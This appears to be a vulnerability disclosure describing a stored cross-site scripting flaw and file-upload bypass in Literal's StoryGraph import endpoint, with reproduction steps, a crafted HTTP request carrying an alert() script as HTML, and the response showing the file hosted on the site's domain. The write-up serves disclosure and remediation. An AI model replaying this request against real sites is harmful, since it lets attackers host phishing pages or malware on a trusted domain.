## Stored XSS & File Upload Bypass

**Description:** Within the Storygraph "Import" functionality lies a stored cross-site scripting vulnerability, along with a file upload bypass. It could allow any authenticated user the ability to upload and host any file type. One scenario could be someone who hosts a phishing page using Literal's website. Another could be that they host malware on the site.

**Affected URL:** https://assets.literal.club/api/user/upload-file/storygraph

1. Navigate to the site as an authenticated user. Select "View Profile" then select "Settings".

2. Select "Import/Export" then while using a web proxy, such as Burp Suite, select "Import" located to the right of the StoryGraph icon. Upload an arbitrary file. It appears to have gotten stuck in a loop on my profile, so it shows as "Importing" for me.

3. Modify the contents of the request's body by removing the uploaded file and replacing it with arbitrary HTML and JavaScript, then replace the filename's extension and Content-Type. Observe the successful response, and save the URL contained within its body.

**HTTP Request:**
```http
POST /api/user/upload-file/storygraph HTTP/2
Host: assets.literal.club
[TRUNCATED]

------WebKitFormBoundaryZDo2l2tqY5NAcSGv
Content-Disposition: form-data; name="file"; filename="text.html"
Content-Type: text/html

<script>alert("hello!")</script>
<b>Hello!</b>
------WebKitFormBoundaryZDo2l2tqY5NAcSGv--
```

**HTTP Response:**
```http
HTTP/2 200 OK
Date: Wed, 16 Jul 2025 00:26:23 GMT
[TRUNCATED]

{"url":"https://assets.literal.club/user-file/storygraph/cmd580rez03lk0i202rdzd5cb.html"}
```

4. Navigate to the URL and observe that the HTML and JavaScript are rendered to the user, and are hosted on Literal's domain.
